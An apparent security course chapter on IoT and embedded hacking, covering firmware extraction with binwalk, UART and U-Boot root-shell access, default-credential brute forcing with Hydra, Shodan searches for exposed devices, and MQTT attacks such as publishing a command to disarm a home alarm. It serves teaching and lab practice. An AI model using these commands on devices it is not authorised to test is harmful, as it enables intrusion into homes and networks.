---
title: 'IoT & Embedded Security'
subtitle: 'Firmware extraction and analysis, UART/JTAG debugging, default credentials, protocol attacks, and hardware hacking fundamentals.'
chapter: 25
level: 'advanced'
readingTime: '12 min'
topics:
  [
    'IoT security',
    'firmware analysis',
    'hardware hacking',
    'UART',
    'JTAG',
    'binwalk',
    'default credentials',
    'embedded systems'
  ]
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

<Callout type="info">

**Real-World Analogy**

IoT devices are computers that were designed by hardware engineers who had one job: make it cheap. Security was afterthought. The default password is "admin". The firmware is downloadable. The UART port is exposed. The device is on your network.

</Callout>

## IoT Attack Surface

```
Network:
  - Default credentials (admin/admin, root/root, root/[blank])
  - Exposed management interfaces (Telnet, SSH, HTTP admin panel)
  - Unencrypted protocols (Telnet, HTTP, MQTT, CoAP, Modbus)
  - UPnP exposing internal services to internet
  - mDNS/Bonjour leaking device info

Hardware:
  - UART console (serial debug port)
  - JTAG (hardware debugging interface)
  - Flash memory (SPI/EEPROM) — extract firmware directly
  - Unprotected boot process (drop to root shell)

Firmware:
  - Hardcoded credentials
  - Outdated Linux kernel with known CVEs
  - Outdated OpenSSL, OpenSSH
  - Debug features left enabled
  - World-readable filesystem with secrets
```

## Network Reconnaissance for IoT

```bash
# Discover IoT devices on network
sudo nmap -sV -p 22,23,80,443,8080,8443,8888,9999 192.168.1.0/24

# Shodan for internet-exposed devices
shodan search "Hikvision" country:US           # IP cameras
shodan search "router admin" country:US        # exposed admin panels
shodan search "default password" country:US
shodan search product:MQTT
shodan search "Server: Boa"                    # common IoT web server

# Default credentials for common devices
# https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
# Router: admin/admin, admin/password, admin/[blank]
# IP cameras: root/root, root/[blank], admin/admin
# SCADA: Many have no authentication at all

# Test default credentials with Hydra
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
  192.168.1.1 http-get /
```

## Firmware Acquisition

```bash
# Method 1: Download from vendor website
# Most vendors publish firmware on support pages
wget https://www.vendor.com/firmware/router_v2.3.1.bin

# Method 2: Capture during update
# Intercept the update HTTP request with Wireshark
# Or set up transparent proxy

# Method 3: Extract from device (hardware)
# UART → get shell → dd the flash
# JTAG → halt CPU → read memory
# SPI flash → desolder chip → read with programmer

# Method 4: From running device via shell
dd if=/dev/mtd0 of=/tmp/firmware.bin   # if you have shell access
```

## Firmware Analysis with Binwalk

```bash
# Analyze firmware structure
binwalk firmware.bin

# Common output:
# DECIMAL  HEXADECIMAL  DESCRIPTION
# 0        0x0          TRX firmware header
# 28       0x1C         LZMA compressed data
# 131072   0x20000      Squashfs filesystem, little endian

# Extract all embedded files
binwalk -e firmware.bin
# Creates _firmware.bin.extracted/ directory

# Recursive extraction
binwalk -Me firmware.bin

# List files in extracted filesystem
ls _firmware.bin.extracted/squashfs-root/

# Look for:
# /etc/passwd, /etc/shadow       → user accounts
# /etc/config/                    → device config
ls _firmware.bin.extracted/squashfs-root/etc/
# Private keys, certificates
find _firmware.bin.extracted/ -name "*.pem" -o -name "*.key" -o -name "id_rsa"
# Hardcoded credentials in binaries
grep -r "password\|passwd\|secret" _firmware.bin.extracted/etc/ 2>/dev/null
```

## Firmware Static Analysis

```bash
# Search for passwords
grep -r "admin" _firmware.bin.extracted/etc/ 2>/dev/null
grep -r "root:" _firmware.bin.extracted/etc/passwd 2>/dev/null
cat _firmware.bin.extracted/etc/shadow 2>/dev/null

# Analyze binaries with radare2 / Ghidra
# Copy binaries to analysis machine
cp _firmware.bin.extracted/usr/sbin/httpd ./
file httpd   # architecture: MIPS, ARM, x86?

# Cross-architecture strings
strings httpd | grep -iE "(password|admin|debug|key|secret|token)"

# Import into Ghidra for decompilation
# Set architecture to match firmware (MIPS, ARM Thumb, etc.)

# Find command injection vectors in web server
strings httpd | grep "system\|popen\|execve\|sprintf"
```

## UART — Serial Console Access

UART is a serial debug port found on most embedded devices. Getting access = interactive shell.

```bash
# Equipment needed:
# - USB-to-UART adapter (CP2102, CH340) ~$5
# - Multimeter or logic analyzer to identify pins
# - Breadboard jumper wires

# Identify UART pins (usually 4 pins: VCC, GND, TX, RX)
# Use multimeter in DC voltage mode:
# VCC: ~3.3V or 5V
# GND: 0V
# TX: voltage oscillates during boot (~1.65V average for 3.3V logic)
# RX: floating or same as VCC

# Find baud rate (common: 115200, 57600, 9600)
# Connect USB-UART:
# Device TX → Adapter RX
# Device RX → Adapter TX
# Device GND → Adapter GND (do NOT connect VCC!)

# Connect with screen or minicom
screen /dev/ttyUSB0 115200
minicom -D /dev/ttyUSB0 -b 115200

# If you see garbled output: wrong baud rate
# If no output: TX/RX swapped — swap connections
# During boot: watch for Linux kernel boot messages, then login prompt
# Or: watch for U-Boot bootloader (can interrupt to get root shell)
```

### U-Boot Exploitation

```bash
# During UART connection, watch for:
# "Hit any key to stop autoboot: 3"
# Press any key → drops to U-Boot shell

# U-Boot commands:
printenv            # print environment variables (may have credentials)
setenv bootargs ... # modify boot arguments
run bootcmd         # execute boot command
boot                # boot with modifications

# Boot with modified kernel args to get root shell:
setenv bootargs "console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=jffs2 init=/bin/sh"
boot

# Now in /bin/sh — mount filesystems:
mount /dev/mtdblock3 /
mount -t proc proc /proc
# Change root password, add SSH key, etc.
```

## Emulating Firmware

```bash
# QEMU — emulate firmware without real hardware
# Good for analysis without destroying a device

# FIRMADYNE — automated firmware emulation
git clone https://github.com/firmadyne/firmadyne
cd firmadyne

# Identify architecture from binaries
file _firmware.bin.extracted/bin/busybox
# busybox: ELF 32-bit LSB executable, MIPS, version 1 (SYSV)

# Emulate with QEMU (MIPS example)
qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
  -hda /path/to/disk.img -append "root=/dev/sda1" \
  -nographic -serial mon:stdio

# Simpler: use QEMU user-mode for single binary testing
qemu-mipsel -L _firmware.bin.extracted/ _firmware.bin.extracted/usr/sbin/httpd
```

## MQTT Protocol Attacks

MQTT is the most common IoT messaging protocol — often unauthenticated.

```bash
# Discover MQTT brokers
nmap -p 1883,8883 192.168.1.0/24
shodan search product:MQTT port:1883

# Connect to MQTT broker (unauthenticated)
mosquitto_sub -h 192.168.1.100 -p 1883 -t "#" -v
# # = wildcard, subscribes to ALL topics
# Shows all messages on the broker — sensors, control commands, credentials

# Publish malicious commands
mosquitto_pub -h 192.168.1.100 -p 1883 -t "home/lights/1/set" -m '{"state":"OFF"}'
mosquitto_pub -h 192.168.1.100 -p 1883 -t "home/alarm/set" -m '{"state":"disarmed"}'

# Brute force MQTT credentials
# ncrack supports MQTT in newer versions
# Or custom Python script using paho-mqtt
```

## Real Project: Vulnerable IoT Device

```bash
# DVID (Damn Vulnerable IoT Device) — virtual IoT practice
git clone https://github.com/Vulcainreo/DVID
cd DVID
docker-compose up

# Available challenges:
# - Default credential bypass
# - UART console access simulation
# - Firmware analysis (hardcoded credentials)
# - BLE (Bluetooth Low Energy) sniffing
# - MQTT message tampering

# Or: IoTGoat — OWASP's vulnerable firmware
# Based on OpenWrt, contains intentional vulnerabilities
# https://github.com/OWASP/IoTGoat
```

## Common IoT CVEs Pattern

```bash
# Check installed packages against CVE databases
cat _firmware.bin.extracted/etc/opkg/status | grep -E "Package|Version"
# BusyBox 1.23.2 → CVE-2015-9261
# OpenSSL 1.0.2k → CVE-2017-3737, dozens more
# OpenSSH 6.7 → CVE-2016-0777

# Vulnerable telnet (backdoor accounts common!)
grep -r "telnet" _firmware.bin.extracted/etc/ 2>/dev/null
grep -r "backdoor\|debug" _firmware.bin.extracted/ 2>/dev/null

# Hardcoded password patterns:
grep -r "password" _firmware.bin.extracted/etc/ 2>/dev/null
grep -rn "admin\|root\|guest\|service" _firmware.bin.extracted/etc/passwd 2>/dev/null
# Look for: root::0:0 (root with empty password)
```
